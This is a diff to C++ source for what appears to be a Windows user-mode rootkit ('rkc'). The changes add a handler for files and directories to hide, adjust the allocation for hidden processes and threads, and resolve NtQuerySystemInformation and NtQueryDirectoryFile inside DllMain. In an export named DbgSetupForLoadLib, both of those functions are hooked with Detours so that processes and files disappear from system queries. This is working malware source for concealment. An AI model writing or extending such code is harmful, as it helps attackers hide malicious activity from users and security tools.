@@ -23,7 +23,7 @@ namespace rkc {
 				case RKCTLC(0, 1): // Add ProcessThread to hide
 					ProcessList.WriteLock(); {
 						uint8 v0 = pcd->dwData & 0xf;
-						void* mem = ProcessList.AllocateObject(4 * (v0 + 1) + 1);
+						void* mem = ProcessList.AllocateObject(4 * v0 + 5);
 						*(uint8*)mem = v0;
 						v0 ? *(uint64*)((ptr)mem + 1) = *(uint64*)pcd->lpData
 							: *(uint32*)((ptr)mem + 1) = *(uint32*)pcd->lpData;
@@ -47,7 +47,10 @@ namespace rkc {
 
 
 				case RKCTLC(1, 0): // Add File/Directory to hide
-					break;
+					ProcessList.WriteLock(); {
+						void* mem = ProcessList.AllocateObject(pcd->cbData);
+						memcpy(mem, pcd->lpData, pcd->cbData);
+					} ProcessList.WriteUnlock(); break;
 				case RKCTLC(1, 1): // Remove File/Directory to hide
 					break;
 
@@ -165,13 +168,8 @@ extern "C" __declspec(dllexport) long __stdcall DbgSetupForLoadLib(
 	}
 	CloseHandle(hTSnap);
 
-	hk::NtQuerySystemInformation = (nt::NtQuerySystemInformation_t)
-		GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
 	DetourAttach(&(void*&)hk::NtQuerySystemInformation, hk::NtQuerySystemInformationHook);
-	hk::NtQueryDirectoryFile = (nt::NtQueryDirectoryFile_t)
-		GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryDirectoryFile");
 	DetourAttach(&(void*&)hk::NtQueryDirectoryFile, hk::NtQuerySystemInformationHook);
-
 	DetourTransactionCommit();
 
 	// CleanUp
@@ -188,6 +186,11 @@ BOOL WINAPI DllMain(
 
 	switch (fdwReason) {
 	case DLL_PROCESS_ATTACH:
+		hk::NtQuerySystemInformation = (nt::NtQuerySystemInformation_t)
+			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
+		hk::NtQueryDirectoryFile = (nt::NtQueryDirectoryFile_t)
+			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryDirectoryFile");
+
 		return true;
 
 	case DLL_THREAD_ATTACH:
